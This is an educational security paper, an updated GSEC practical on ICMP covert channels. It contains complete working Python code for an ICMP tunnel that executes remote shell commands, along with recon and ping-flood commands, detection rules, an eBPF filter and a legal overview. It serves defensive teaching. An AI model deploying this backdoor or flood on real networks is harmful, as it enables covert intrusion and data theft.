# ICMP: Crafting and Other Uses — 2026 Edition

**Author:** Stuart Thomas  
**Original paper:** *ICMP: Crafting and Other Issues*, GIAC GSEC Version 2.0, August 2001  
**Updated:** April 2026  
**Licence:** Author retains full rights. Original published at GIAC/SANS Institute practical repository.  
**Wikipedia:** Listed in external links of [ICMP tunnel](https://en.wikipedia.org/wiki/ICMP_tunnel)

> **Legal notice.** This paper is published for educational and defensive security purposes. Proof-of-concept code must only be used on networks and systems you own, control, or have **explicit written authorisation** to test. Unauthorised use constitutes a criminal offence in most jurisdictions — see §7 for a full legal analysis. This document is not legal advice.

---

## Preface to the 2026 Edition

The original paper was written in 2001 during my GIAC Security Essentials (GSEC) certification. At the time, ICMP tunnelling was a relatively novel technique known mainly to specialist researchers and Phrack readers. LOKI was the primary tool, hping was the packet crafter of choice, and Snort was how you caught it.

Twenty-five years on, the fundamentals remain unchanged — RFC 792 still defines ICMP, the echo payload is still unrestricted, and firewalls still pass ICMP without inspection far more often than they should. What has changed: the tooling, the threat landscape, the legal framework, the detection capabilities, and the deployment environments in which this matters.

This edition preserves the original structure and voice, updates every technical section for 2026, introduces a working Python PoC replacing the LOKI walkthrough, and adds a comprehensive legal section that was not present in the original — because in 2001, nobody was prosecuted under the Computer Misuse Act for writing a GSEC paper.

— *Stuart Thomas, April 2026*

---

## 1. Introduction

The intention of this paper is to provide an insight into how ICMP, a well-known and widely used protocol, can be used against a network — and how defenders can detect and prevent that use.

One of the most interesting things about people, and possibly society on the whole, is how accepting and trusting people can be. Most people who work with networks use ping; the ability to send a message and wait for a reply is fundamental to the way networks are operated. People take it for granted. ICMP is one such tool that many people seem to ignore as a security threat.

It is well known in security circles that ICMP — specifically echo request (Type 8) and echo reply (Type 0) — can be used to flood a network that is not properly protected, assisting denial-of-service attacks such as the Smurf amplification attack (CERT CA-1998-01). What does not seem to be as well understood — even now — is that ICMP can also be used as a covert channel, bypassing firewalls and access control systems entirely.

ICMP echo-request and echo-reply are rarely blocked. Try pinging a major corporation. You will get a reply.

---

## 2. Protocol Foundations

### 2.1 The ICMP packet structure

RFC 792 (Postel, 1981) defines the Internet Control Message Protocol. It operates at the network layer, encapsulated directly within IP. For our purposes, the critical messages are:

- **Type 8** — Echo Request (`ping` outbound)
- **Type 0** — Echo Reply (`ping` response)

The echo message structure:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier          |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Data (variable length)                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

RFC 792 is explicit: *"The data received in the echo message must be returned in the echo reply message."* It places **no restriction on the content or length of the Data field**. This is the fundamental design characteristic that makes tunnelling possible.

| Field | Notes |
|---|---|
| Identifier | Often the process ID; can be used as a session cookie |
| Sequence Number | Incremented per packet; can carry chunk ordering |
| **Data** | **Completely arbitrary — any bytes, any length up to IP MTU** |

### 2.2 Why ICMP is trusted

Network operators commonly apply a rule: block inbound TCP and UDP from untrusted sources, but permit ICMP — reasoning that diagnostic traffic must flow freely. This assumption is the root of the attack surface.

A host that can exchange ICMP echo packets with an external host has a fully bidirectional channel that most perimeter controls will neither block nor inspect. In 2001, this was a curiosity. In 2026, it is a documented technique in every major penetration testing framework.

---

## 3. The Covert Channel

In the field of information systems security, a *channel* is:

> *"...an information transfer path within a system..."* — Andress, M. *CISSP Exam Cram*, Coriolis 2001

A *covert channel* is:

> *"...a process to transfer information in a manner that violates the system's security policy..."* — Northcutt, S. & Novak, J. *Network Intrusion Detection*, New Riders 2000

An ICMP tunnel is precisely this: a back door within a network that transcends and bypasses a firewall, authentication mechanisms, and any TCP/UDP filtering — by riding a protocol that defenders assume is safe to pass.

---

## 4. Hypothetical Attack Scenario

*The following scenario is fictional and presented for educational purposes.*

From a lab perspective it is relatively easy to create ICMP tunnelling from one host to another through a firewall. In the real world, a malicious former employee might leave a backdoor daemon running on an internal server before departure, giving unrestricted access to the internal network through a perimeter that blocks all TCP and UDP.

A determined attacker arriving from the Internet could compromise an unpatched server — for example an SMTP daemon vulnerable to a buffer overflow. Once initial access is obtained, maintaining it without triggering TCP-based intrusion detection is a challenge. ICMP tunnelling solves this.

### 4.1 Original network topology (2001 lab)

```
 Internet         Perimeter           DMZ                  Internal
    │                  │               │                       │
 Attacker         Router/FW       SMTP Gateway          Internal hosts
 x.x.x.x    x.66.207.2/30    x.66.207.10/30        192.168.1.0/24
                               (compromised)

 Only permitted inbound: ICMP + TCP/25 (SMTP)
 ICMP Tunnel: Attacker ←──ICMP Echo Req/Reply──→ SMTP Gateway
```

In this setup only ICMP and TCP port 25 are allowed inbound through the firewall. The attacker, having compromised the SMTP gateway, installs a server-side tunnel daemon. Communication then flows entirely through ICMP echo packets that the firewall passes without inspection.

The attacker's goals — capturing email, traversing the internal network — are achieved through what looks like routine ICMP diagnostic traffic.

### 4.2 Reconnaissance: nmap (then and now)

**2001 — identifying the perimeter:**
```bash
nmap -sS -sU x.66.207.1-254
# SYN scan + UDP scan; confirms only TCP/25 and ICMP reachable
```

**2026 — same technique, more options:**
```bash
# Modern nmap: OS detection, version scanning, scripting engine
nmap -sS -sU -O -sV --script=banner x.66.207.1-254

# Verify ICMP is specifically reachable
nmap -PE -sn x.66.207.1-254     # ICMP echo ping sweep

# Confirm no ICMP filtering on payload size (a precursor to tunnelling)
hping3 --icmp -d 1400 -c 3 x.66.207.10
# If replies received with 1400-byte payload: tunnel is viable
```

---

## 5. Observing ICMP Traffic

### 5.1 Normal ICMP — then (2001 Snort capture)

The original paper captured normal ICMP traffic using Snort. The BSD ping sends a recognisable repeating byte pattern in the data field:

```
11/28-01:39:04.366248 x.x.x.x -> x.66.207.10
ICMP TTL:255 TOS:0x0 ID:45431 IpLen:20 DgmLen:84
Type:8  Code:0  ID:26458  Seq:13824  ECHO
<.@8...k........................ !"#$%&'()*+,-./01234567
```

The echo reply returns the identical data — RFC 792 compliance: *"the data received in the echo message must be returned in the echo reply message."*

### 5.2 Crafted ICMP — the key insight

The original paper used hping to craft an ICMP echo reply with arbitrary content — proving that the data field is completely unchecked by the receiving host:

```bash
# 2001: hping crafting arbitrary ICMP payload
hping --icmp -I fxp0 --icmptype 0 -d 101 -E test x.x.x.x
```

The Snort capture proved the point:

```
11/28-02:34:30.700079 x.x.x.x -> x.66.207.10
ICMP TTL:64 TOS:0x0 ID:58592 IpLen:20 DgmLen:58
Type:8  Code:0  ID:11478  Seq:34  ECHO
my data, could be naughty.....

11/28-02:34:30.827371 x.66.207.10 -> x.x.x.x
ICMP TTL:118 TOS:0x0 ID:14180 IpLen:20 DgmLen:58
Type:0  Code:0  ID:11478  Seq:34  ECHO REPLY
my data, could be naughty.....
```

The target host returned exactly what was sent. No validation. No filtering. A channel.

### 5.3 Modern equivalent — Scapy (2026)

```python
# Modern equivalent of the hping test — requires root, use on own systems only
from scapy.all import IP, ICMP, Raw, sr1

target = "192.168.1.1"  # your own test host

# Craft echo request with arbitrary payload
pkt = IP(dst=target) / ICMP(type=8, code=0) / Raw(load=b"my data, could be naughty.....")
reply = sr1(pkt, timeout=3, verbose=False)

if reply and reply.haslayer(ICMP):
    print(f"[+] Reply type: {reply[ICMP].type}")
    if reply.haslayer(Raw):
        print(f"[+] Payload returned: {reply[Raw].load}")
        # Confirms: whatever you send comes back — the channel is open
```

---

## 6. Proof-of-Concept: Python ICMP Tunnel

> **Authorisation required.** Use only on systems you own or have written permission to test. Raw sockets require root/CAP_NET_RAW.

The original paper demonstrated LOKI — a 1997 Phrack tool implementing exactly the pseudo-code Stuart published. The 2026 equivalent is written in Python using only the standard library, making it more transparent and educational.

### 6.1 Original pseudo-code (2001, preserved verbatim)

The server pseudo-code from the original paper:

```
Initialise packet capture engine; watch out for only ICMP and "my tag".
# A tag would separate normal ICMP traffic from my crafted traffic.
# The tag would be located in the data field of an ICMP echo-request or reply.

:START
IF capture.packet EQUALS icmp AND my.tag THEN
{
    IF my.tag EQUALS [naughty.traffic] AND [List] THEN
    {
        /bin/ls OUTPUT to file, sent echo-reply, with
        contents of file in the data part of the message,
        and the my.tag.
    }
    ELSE
    {
        IGNORE, CONTINUE TO LISTEN.
        :START
    }
}
```

The client pseudo-code:

```
:START
SEND ECHO-REQUEST to IP address, with my.tag AND List.
LISTEN FOR REPLY,

IF RESPONSE EQUAL ICMP and my.tag, THEN OUTPUT data part
of ICMP message to screen or file.

ELSE
{
    TIMEOUT IF NO RESPONSE (time variable).
    EXIT PROGRAM.
}
```

This is precisely what the 2026 implementation below does — now in working Python.

### 6.2 Shared library (`icmp_common.py`)

```python
"""
icmp_common.py — ICMP packet construction and tunnel framing.
For educational use only. Use only on systems you own or are authorised to test.
Implements the 2001 pseudo-code from 'ICMP: Crafting and other uses' by Stuart Thomas.
"""
import socket, struct, os

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0
TUNNEL_TAG        = b"ST26"   # the 2026 equivalent of Stuart's "my tag"

def checksum(data: bytes) -> int:
    """RFC 792 one's-complement checksum."""
    if len(data) % 2:
        data += b'\x00'
    total = sum(
        (data[i] << 8) + data[i+1]
        for i in range(0, len(data), 2)
    )
    total = (total >> 16) + (total & 0xFFFF)
    total += (total >> 16)
    return ~total & 0xFFFF

def build_packet(icmp_type: int, ident: int, seq: int, payload: bytes) -> bytes:
    """Build a raw ICMP echo packet with arbitrary payload."""
    hdr = struct.pack('!BBHHH', icmp_type, 0, 0, ident, seq)
    cs  = checksum(hdr + payload)
    return struct.pack('!BBHHH', icmp_type, 0, cs, ident, seq) + payload

def parse_packet(raw: bytes):
    """Strip 20-byte IP header, return (type, ident, seq, payload) or None."""
    if len(raw) < 28:
        return None
    icmp = raw[20:]
    t, _, ident, seq = struct.unpack('!BBHH', icmp[:6])
    return t, ident, seq, icmp[8:]

def wrap(session: int, chunk_seq: int, last: bool, data: bytes) -> bytes:
    """Framing: TAG(4) + session(2) + chunk_seq(2) + last(1) + len(2) + data."""
    flags = 0x01 if last else 0x00
    return TUNNEL_TAG + struct.pack('!HHbH', session, chunk_seq, flags, len(data)) + data

def unwrap(payload: bytes):
    """Returns (session, chunk_seq, last, data) or None if not tunnel traffic."""
    if len(payload) < 11 or payload[:4] != TUNNEL_TAG:
        return None
    session, chunk_seq, flags, length = struct.unpack('!HHbH', payload[4:11])
    return session, chunk_seq, bool(flags & 0x01), payload[11:11+length]
```

### 6.3 Server — `icmp_server.py`

```python
"""
icmp_server.py — ICMP tunnel server (the 'LOKID' equivalent for 2026).
Listens for tagged ICMP echo requests, executes the command, returns output
in ICMP echo replies. Run in an isolated VM only.

Educational use only. Use only on systems you own or are authorised to test.
"""
import socket, subprocess, sys
from icmp_common import (
    ICMP_ECHO_REQUEST, ICMP_ECHO_REPLY,
    build_packet, parse_packet, wrap, unwrap
)

CHUNK = 1400   # max payload per ICMP reply packet

def serve():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        sys.exit("[!] Requires root / CAP_NET_RAW")

    print("[*] ICMP tunnel server listening (Ctrl+C to stop)...")

    while True:
        try:
            raw, addr = sock.recvfrom(65535)
        except KeyboardInterrupt:
            print("\n[*] Done.")
            break

        parsed = parse_packet(raw)
        if not parsed:
            continue
        ptype, ident, seq, payload = parsed

        if ptype != ICMP_ECHO_REQUEST:
            continue

        frame = unwrap(payload)
        if not frame:
            continue                     # normal ping — ignore it

        session, _, _, data = frame
        cmd = data.decode(errors='replace').strip()
        print(f"[+] {addr[0]}  cmd: {cmd!r}")

        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                timeout=10, text=True
            )
            out = (result.stdout + result.stderr).encode()
        except subprocess.TimeoutExpired:
            out = b"[timeout]"
        except Exception as e:
            out = f"[error: {e}]".encode()

        # Fragment output and send in ICMP echo replies
        chunks = [out[i:i+CHUNK] for i in range(0, max(1, len(out)), CHUNK)]
        for i, chunk in enumerate(chunks):
            reply_payload = wrap(session, i, i == len(chunks)-1, chunk)
            pkt = build_packet(ICMP_ECHO_REPLY, ident, seq + i, reply_payload)
            sock.sendto(pkt, addr)

if __name__ == '__main__':
    serve()
```

### 6.4 Client — `icmp_client.py`

```python
"""
icmp_client.py — ICMP tunnel client (the 'loki' equivalent for 2026).
Sends commands in ICMP echo requests, receives output from echo replies.

Educational use only. Use only on systems you own or are authorised to test.
"""
import socket, sys, time, os, random
from icmp_common import (
    ICMP_ECHO_REPLY, ICMP_ECHO_REQUEST,
    build_packet, parse_packet, wrap, unwrap
)

TIMEOUT = 5.0

def send_command(proxy: str, cmd: str) -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(TIMEOUT)
    except PermissionError:
        sys.exit("[!] Requires root / CAP_NET_RAW")

    session = random.randint(1, 0xFFFF)
    ident   = os.getpid() & 0xFFFF
    seq     = random.randint(0, 0xFFFF)

    # Send the command inside an ICMP echo request
    payload = wrap(session, 0, True, cmd.encode())
    sock.sendto(build_packet(ICMP_ECHO_REQUEST, ident, seq, payload), (proxy, 0))

    # Collect fragmented reply
    chunks  = {}
    deadline = time.time() + TIMEOUT
    while time.time() < deadline:
        try:
            raw, _ = sock.recvfrom(65535)
        except socket.timeout:
            break
        parsed = parse_packet(raw)
        if not parsed:
            continue
        ptype, _, _, data = parsed
        if ptype != ICMP_ECHO_REPLY:
            continue
        frame = unwrap(data)
        if not frame:
            continue
        recv_session, chunk_seq, last, chunk_data = frame
        if recv_session != session:
            continue
        chunks[chunk_seq] = chunk_data
        if last:
            break

    sock.close()
    return b''.join(chunks[k] for k in sorted(chunks)).decode(errors='replace')

def main():
    if len(sys.argv) < 2:
        sys.exit(f"Usage: {sys.argv[0]} <proxy_ip>")
    proxy = sys.argv[1]
    print(f"[*] ICMP tunnel → {proxy}  (Ctrl+C to exit)\n")
    while True:
        try:
            cmd = input("icmp$ ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        if cmd:
            print(send_command(proxy, cmd), end='')

if __name__ == '__main__':
    main()
```

### 6.5 Example session (isolated lab only)

```bash
# On the server VM (root required):
sudo python3 icmp_server.py
# [*] ICMP tunnel server listening...

# On the client VM (root required):
sudo python3 icmp_client.py 192.168.64.5

icmp$ id
uid=0(root) gid=0(root) groups=0(root)

icmp$ hostname
server-vm

icmp$ ls /etc/passwd
/etc/passwd
```

This replicates the original LOKI session shown in the 2001 paper — now in transparent Python rather than a compiled 1997 binary.

---

## 7. Other ICMP Issues (Updated for 2026)

### 7.1 OS fingerprinting via ICMP (2001: X-Probe → 2026: nmap/p0f)

The original paper discussed X-Probe, which identified operating systems by analysing ICMP Type 3 (Destination Unreachable) responses to crafted UDP probes. Different IP stacks return subtly different TTL, IPID, flags, and checksum values.

```
# 2001: X-Probe result
6502# ./x -i fxp0 x.x.166.7x
FINAL:[ AIX ]
```

In 2026, this is standard nmap `-O` (OS detection) functionality, built on the same principle — ICMP error responses betray the underlying IP stack:

```bash
# Modern OS fingerprinting from ICMP responses
nmap -O --osscan-guess target.ip
sudo p0f -i eth0 -p            # passive OS fingerprinting from traffic
```

### 7.2 Denial of Service via ICMP (2001 → 2026)

The original paper noted the Cisco 12000 series ICMP unreachable DoS (2001). The pattern — exhausting CPU/memory by generating floods of ICMP error responses — persists.

**Modern equivalents:**
- **Ping flood** — volumetric: `hping3 --icmp --flood target`
- **Smurf amplification** — largely mitigated by `no ip directed-broadcast` (RFC 2644), but still possible on misconfigured legacy networks
- **ICMP redirect attacks** — poisoning routing tables via crafted Type 5 messages
- **Path MTU Black Hole** — blocking ICMP Type 3 Code 4 (Fragmentation Needed) breaks PMTUD for TCP sessions

### 7.3 ICMP as a modern C2 channel (2026)

In 2001, LOKI was an experimental Phrack proof-of-concept. By 2026, ICMP-based command-and-control is a documented technique in production offensive tooling:

| Tool | Status (2026) | Notes |
|---|---|---|
| LOKI / LOKI2 | Historical | Phrack 49/51 — the original; still works on unpatched perimeters |
| PingTunnel / ptunnel-ng | Active | TCP-over-ICMP; maintained |
| icmptunnel (DhavalKapil) | Active | Full IP-over-ICMP with TUN/TAP |
| Cobalt Strike | Commercial | ICMP beacon channel module |
| Sliver C2 | Open source | ICMP pivot/transport |
| Metasploit | Open source | `auxiliary/server/icmp_exfil` and related modules |

Nation-state threat actors have used ICMP C2 channels in documented intrusions. The technique that was novel in 1997 is now in every red team's standard playbook.

### 7.4 ICMPv6 — the 2026 expanded surface

ICMPv6 (RFC 4443) is not optional in IPv6 networks. Neighbour Discovery Protocol (NDP) — the IPv6 replacement for ARP — depends entirely on ICMPv6. This means ICMPv6 cannot be blocked wholesale without breaking basic IPv6 operation.

ICMPv6 echo request/reply (Types 128/129) carry the same arbitrary payload as ICMPv4. As of 2026, ICMPv6 traffic receives less scrutiny from security tools than ICMPv4, and many organisations have weaker perimeter filtering rules for IPv6 than IPv4.

```python
# ICMPv6 tunnel probe (scapy, own systems only)
from scapy.all import IPv6, ICMPv6EchoRequest, Raw, sr1

pkt = IPv6(dst="::1") / ICMPv6EchoRequest() / Raw(load=b"icmpv6 covert channel")
reply = sr1(pkt, timeout=3)
if reply:
    print(f"[+] ICMPv6 echo reply received — v6 channel viable")
```

---

## 8. Detection and Defence (2026)

The original paper's detection advice: use Snort, enable IDS, watch for anomalies. That advice is still correct — the tools have just improved significantly.

### 8.1 What to look for

| Anomaly | Explanation |
|---|---|
| **Oversized payload** | Standard ping: 32–64 bytes. Tunnel: up to ~1,400 bytes |
| **High frequency** | Normal hosts: a few pings per session. Tunnel: hundreds/minute |
| **Non-standard content** | Ping sends repeating byte patterns. Tunnel sends structured/encrypted data |
| **Irregular ID/seq fields** | Normal ping increments seq monotonically from 0. Tunnel may randomise |
| **Asymmetric traffic** | More echo replies than requests (server sending bulk data back) |
| **ICMP to unusual destinations** | Outbound ICMP to non-gateway IPs |

### 8.2 Snort/Suricata rules (2026)

```
# Flag oversized ICMP echo payloads — the primary tunnel indicator
alert icmp any any -> any any (
    msg:"ICMP tunnel - oversized payload";
    itype:8;
    dsize:>200;
    threshold: type both, track by_src, count 5, seconds 60;
    classtype:policy-violation;
    sid:9000001; rev:2026;
)

# Flag the ST26 tag from this paper's PoC
alert icmp any any -> any any (
    msg:"ICMP tunnel - ST26 tag detected";
    itype:8;
    content:"ST26";
    offset:0; depth:4;
    sid:9000002; rev:2026;
)

# Flag high-rate ICMP from a single source
alert icmp any any -> any any (
    msg:"ICMP flood / tunnel - high rate";
    itype:8;
    threshold: type threshold, track by_src, count 50, seconds 10;
    sid:9000003; rev:2026;
)
```

### 8.3 Payload entropy analysis

```python
import math, collections

def entropy(data: bytes) -> float:
    """Shannon entropy. Random/encrypted ≈ 8.0. Normal ping ≈ 3.5–4.5."""
    if not data:
        return 0.0
    freq = collections.Counter(data)
    total = len(data)
    return -sum((c/total) * math.log2(c/total) for c in freq.values())

# In a traffic analyser: flag ICMP payloads > 64 bytes with entropy > 6.5
# This catches both encrypted tunnels and compressed data
```

### 8.4 eBPF-based kernel enforcement (Linux 5.8+, 2026)

```c
// XDP program: drop ICMP echo requests with data payload > 100 bytes
// Attach with: ip link set dev eth0 xdp obj icmp_filter.o sec xdp
SEC("xdp")
int icmp_tunnel_guard(struct xdp_md *ctx) {
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (bpf_ntohs(eth->h_proto) != ETH_P_IP) return XDP_PASS;

    struct iphdr *ip = data + sizeof(*eth);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != IPPROTO_ICMP) return XDP_PASS;

    __u32 ip_hdr_len = ip->ihl * 4;
    struct icmphdr *icmp = (void *)ip + ip_hdr_len;
    if ((void *)(icmp + 1) > data_end) return XDP_PASS;
    if (icmp->type != ICMP_ECHO) return XDP_PASS;

    __u16 total   = bpf_ntohs(ip->tot_len);
    __u16 payload = total - ip_hdr_len - sizeof(*icmp);

    if (payload > 100) {
        // Log via bpf_printk and drop
        bpf_printk("ICMP tunnel blocked: %d byte payload from source\n", payload);
        return XDP_DROP;
    }
    return XDP_PASS;
}
```

### 8.5 Recommended mitigations

Stuart's 2001 recommendations held up remarkably well. Updated for 2026:

| Control | 2001 advice | 2026 update |
|---|---|---|
| Block ICMP entirely | ✓ mentioned | Remains effective but kills diagnostics; impractical for most networks |
| Restrict payload size | ✓ mentioned | Enforce ≤ 100 bytes via firewall or eBPF; minimal operational impact |
| IDS/IPS | Snort on OpenBSD | Suricata, Zeek, or cloud-native equivalents; ML-based anomaly detection |
| Firewall ACLs | Cisco ACL examples | NGFWs with ICMP deep packet inspection |
| Security policy | ✓ strongly emphasised | Still the foundation; add cloud and container network policies |
| Server hardening | CERT/SANS guides | CIS Benchmarks, automated compliance scanning |
| Staff education | ✓ mentioned | Add security awareness training specifically covering covert channels |
| Logging | ✓ mentioned | Centralised SIEM; ICMP events are cheap to log, expensive to miss |

The CIA triad — Confidentiality, Integrity, Availability — remains the correct frame. ICMP tunnelling attacks all three: it exfiltrates data (confidentiality), enables remote command execution (integrity), and can be weaponised for DoS (availability).

---

## 9. Legal Framework

*This section was not present in the 2001 paper. It is included because the legal landscape has changed significantly, and because responsible publication requires it.*

> This section is provided as an educational overview. **It is not legal advice.** Consult a qualified solicitor or attorney for advice specific to your situation.

### 9.1 England and Wales — Computer Misuse Act 1990 (as amended)

The Computer Misuse Act 1990 (CMA) is the primary legislation in England and Wales:

**Section 1 — Unauthorised access.** Using ICMP tunnelling to bypass a captive portal, corporate egress control, or any network access mechanism you are not authorised to bypass constitutes an offence. The fact that ICMP was "accidentally" left open in the firewall policy does not constitute authorisation.

**Section 3 — Unauthorised acts with intent to impair.** Using an ICMP tunnel to execute commands on a compromised system, or to exfiltrate data, engages s.3.

**Section 3A (Police and Justice Act 2006) — Making or supplying tools.** Publishing ICMP tunnelling tools is permissible where the tool has a primarily legitimate use and the publisher does not know or intend for it to be used against unauthorised systems. The PoC code in this paper is dual-use, is clearly labelled as educational, and is accompanied by explicit authorisation requirements. CPS prosecution guidance indicates that dual-use tools with clear legitimate purpose are unlikely to be prosecuted under s.3A in isolation.

**Penalty:** s.1 — up to 2 years imprisonment. s.3 — up to 10 years.

### 9.2 United States — Computer Fraud and Abuse Act (18 U.S.C. § 1030)

**§ 1030(a)(2)** — Unauthorised access to obtain information. Using ICMP tunnelling to bypass access controls on a network you are not authorised to access is a federal offence.

**§ 1030(a)(5)** — Knowingly causing damage. Flooding a link with ICMP traffic causing service degradation triggers damage liability.

**Penalty:** 1–20 years depending on intent, prior offences, and whether critical infrastructure is involved.

### 9.3 The authorisation test

| Scenario | Legal? |
|---|---|
| Own home lab, own VMs, own network | Yes |
| Corporate network with signed written pentest authorisation | Yes |
| Client network with signed rules of engagement | Yes |
| Hotel or library captive portal bypass | **No** |
| Corporate egress bypass without authorisation | **No** |
| Residual backdoor on former employer's network | **No — serious criminal exposure** |

### 9.4 Protect yourself

- Obtain **written, signed authorisation** before testing any network you do not own.
- Scope the authorisation to specific IP ranges, time windows, and techniques.
- Document your methodology contemporaneously — keep notes and timestamps.
- For vulnerability disclosures, follow the NCSC coordinated disclosure process: [ncsc.gov.uk/information/vulnerability-reporting](https://www.ncsc.gov.uk/information/vulnerability-reporting)
- If you discover ICMP tunnelling on a network you administer: capture, preserve evidence, then remediate.

---

## 10. Summary and Conclusion

Twenty-five years after the original paper, the conclusion remains the same: ICMP can be used as a covert channel to access compromised systems, exfiltrate data, and maintain persistent access through perimeters that block TCP and UDP. The protocol has not changed. RFC 792's "arbitrary data" payload is still arbitrary. Firewalls still pass ICMP without inspection.

What has changed:

- **The tooling** is now production-quality, not experimental. LOKI in 1997 was a Phrack proof-of-concept. In 2026, ICMP channels are built into Cobalt Strike, Sliver, and Metasploit.
- **The surface** has expanded. ICMPv6 is non-optional in IPv6 networks and receives less scrutiny than ICMPv4.
- **The detection** has improved. eBPF, ML-based anomaly detection, and modern NGFWs with ICMP payload inspection make tunnelling harder to sustain undetected — but only if those controls are actually deployed.
- **The legal framework** is explicit. Using ICMP tunnelling without authorisation is a criminal offence in every major jurisdiction.

What remains unchanged from 2001:

> Prevention is better than cure. A strong security policy, thorough firewall configuration, detailed logging, network-based intrusion detection, server hardening, and educated staff are the foundations. These are still the answer.

The original paper ended by noting that disabling echo-request and echo-reply alone is not sufficient because LOKI "can be re-coded to use different ICMP types, or other protocols such as TCP." That observation was correct in 2001 and remains correct in 2026. Covert channels adapt. Defence must be systematic, not just protocol-specific.

---

## References

### Original references (2001 paper — preserved)

1. Postel, J. *RFC 792 Internet Control Message Protocol*. September 1981. [rfc-editor.org/rfc/rfc792](https://www.rfc-editor.org/rfc/rfc792)
2. van Eden, L. "The Truth About ICMP". SANS GSEC, May 2001.
3. daemon9, route, alhambra. "ICMP Tunnelling". *Phrack* 49, article 6. November 1996. [phrack.org/issues/49/6.html](http://phrack.org/issues/49/6.html)
4. daemon9. "LOKI 2 (the implementation)". *Phrack* 51, article 6. September 1997. [phrack.org/issues/51/6.html](http://phrack.org/issues/51/6.html)
5. CERT Advisory CA-1998-01. *Smurf IP Denial-of-Service Attacks*. [cert.org/advisories/CA-1998-01.html](http://www.cert.org/advisories/CA-1998-01.html)
6. CERT Advisory CA-1997-05. *MIME Conversion Buffer Overflow in Sendmail 8.8.3 and 8.8.4*.
7. Smith, J.C. "Covert Channels". SANS GSEC.
8. Andress, M. *CISSP Exam Cram*. Coriolis, 2001. (Chapter 7, p.138)
9. Northcutt, S. & Novak, J. *Network Intrusion Detection: An Analyst's Handbook*, 2nd ed. New Riders, 2000. (p.63 — Malicious ICMP Activity)
10. Yarochkin, F. & Arkin, O. *X-Probe* (source and documentation). sys-security.com, 2001.
11. SANS.ORG. Security policy and model documents.
12. Sanfilippo, S. *hping* — command-line TCP/IP packet assembler/analyser.
13. Cisco PSIRT. "ICMP Unreachable Vulnerability in Cisco 12000 Series Internet Router". 2001.

### Additional references (2026 edition)

14. RFC 4443. *Internet Control Message Protocol (ICMPv6) for IPv6*. Conta, Deering, Gupta. 2006. [rfc-editor.org/rfc/rfc4443](https://www.rfc-editor.org/rfc/rfc4443)
15. Computer Misuse Act 1990 (as amended). [legislation.gov.uk/ukpga/1990/18](https://www.legislation.gov.uk/ukpga/1990/18/contents)
16. Police and Justice Act 2006 (inserted CMA §3A). [legislation.gov.uk/ukpga/2006/48](https://www.legislation.gov.uk/ukpga/2006/48/contents)
17. 18 U.S.C. § 1030 — Computer Fraud and Abuse Act. [law.cornell.edu/uscode/text/18/1030](https://www.law.cornell.edu/uscode/text/18/1030)
18. EU Directive 2013/40/EU on attacks against information systems.
19. NCSC. *Vulnerability Reporting Guidance*. [ncsc.gov.uk/information/vulnerability-reporting](https://www.ncsc.gov.uk/information/vulnerability-reporting)
20. CPS. *Cybercrime Prosecution Guidance* (2019). [cps.gov.uk/legal-guidance/cybercrime](https://www.cps.gov.uk/legal-guidance/cybercrime)
21. DhavalKapil. *icmptunnel — IP over ICMP*. [github.com/DhavalKapil/icmptunnel](https://github.com/DhavalKapil/icmptunnel)
22. utoni. *ptunnel-ng — TCP over ICMP*. [github.com/utoni/ptunnel-ng](https://github.com/utoni/ptunnel-ng)
23. BishopFox. *Sliver C2 Framework*. [github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)
24. Thomas, S. *ICMP: Crafting and Other Issues*. GIAC GSEC Version 2.0, August 2001. [giac.org/paper/gsec/1354/icmp-crafting-issues/102553](https://www.giac.org/paper/gsec/1354/icmp-crafting-issues/102553)

---

*Author retains full rights. The PoC code in this document is published for educational and defensive security purposes only. Use only on systems you own or have written authorisation to test. Nothing in this document constitutes legal advice.*
